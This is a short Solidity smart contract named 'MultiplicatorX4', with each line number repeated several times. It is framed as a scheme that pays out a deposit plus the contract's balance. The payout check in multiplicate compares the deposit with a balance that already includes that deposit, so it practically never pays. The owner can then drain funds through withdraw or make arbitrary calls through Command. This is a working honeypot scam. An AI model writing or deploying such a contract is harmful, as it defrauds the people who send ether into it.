1: 1: 1: 1: 1: pragma solidity ^0.4.18;
2: 2: 2: 2: 2: 
3: 3: 3: 3: 3: contract MultiplicatorX4
4: 4: 4: 4: 4: {
5: 5: 5: 5: 5:     address public Owner = msg.sender;
6: 6: 6: 6: 6:    
7: 7: 7: 7: 7:     function() public payable{}
8: 8: 8: 8: 8:    
9: 9: 9: 9: 9:     function withdraw()
10: 10: 10: 10: 10:     payable
11: 11: 11: 11: 11:     public
12: 12: 12: 12: 12:     {
13: 13: 13: 13: 13:         require(msg.sender == Owner);
14: 14: 14: 14: 14:         Owner.transfer(this.balance);
15: 15: 15: 15: 15:     }
16: 16: 16: 16: 16:     
17: 17: 17: 17: 17:     function Command(address adr,bytes data)
18: 18: 18: 18: 18:     payable
19: 19: 19: 19: 19:     public
20: 20: 20: 20: 20:     {
21: 21: 21: 21: 21:         require(msg.sender == Owner);
22: 22: 22: 22: 22:         adr.call.value(msg.value)(data);
23: 23: 23: 23: 23:     }
24: 24: 24: 24: 24:     
25: 25: 25: 25: 25:     function multiplicate(address adr)
26: 26: 26: 26: 26:     public
27: 27: 27: 27: 27:     payable
28: 28: 28: 28: 28:     {
29: 29: 29: 29: 29:         if(msg.value>=this.balance)
30: 30: 30: 30: 30:         {        
31: 31: 31: 31: 31:             adr.transfer(this.balance+msg.value);
32: 32: 32: 32: 32:         }
33: 33: 33: 33: 33:     }
34: 34: 34: 34: 34: }